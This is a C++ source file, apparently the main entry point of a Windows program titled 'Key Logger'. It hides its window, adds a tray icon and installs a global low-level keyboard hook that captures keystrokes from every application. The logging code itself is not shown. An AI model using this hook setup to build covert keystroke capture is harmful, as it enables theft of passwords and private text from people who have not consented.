#include "window.hpp"
#include "notifyicon.hpp"
#include <commctrl.h>
#include "resource.hpp"

const wchar_t *CLASS_NAME = TEXT("Key Logger"), *WINDOW_TEXT = TEXT("Log Keys");

int WINAPI wWinMain(HINSTANCE instance, [[maybe_unused]] HINSTANCE prev_instance, [[maybe_unused]] PWSTR cmd_line, [[maybe_unused]] int cmd_show)
{
	WNDCLASS wc;
	HWND hwnd;

	wc = init_window_class(instance, CLASS_NAME);
	RegisterClass(&wc);

	if ((hwnd = create_window_handler(CLASS_NAME, WINDOW_TEXT, instance)) == NULL)
	{
		return 1;
	}

	ShowWindow(hwnd, SW_HIDE);

	NOTIFYICONDATA nid;

	nid = init_notifyicon_data(hwnd);
	if (FAILED(LoadIconMetric(instance, MAKEINTRESOURCE(OIC_TRAY_ICON), LIM_SMALL, &nid.hIcon)))
	{
		return 1;
	}

	if (Shell_NotifyIcon(NIM_ADD, &nid) != TRUE)
	{
		return 1;
	}
	// Must be called every time a notification area icon is added
	if (Shell_NotifyIcon(NIM_SETVERSION, &nid) != TRUE)
	{
		return 1;
	}

	MSG msg = { };
	HHOOK ll_kybd_hook;

	ll_kybd_hook = SetWindowsHookEx(WH_KEYBOARD_LL, low_level_keyboard_proc, instance, 0);

	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}

	DestroyIcon(nid.hIcon);

	Shell_NotifyIcon(NIM_DELETE, &nid);

	UnhookWindowsHookEx(ll_kybd_hook);

	return 0;
}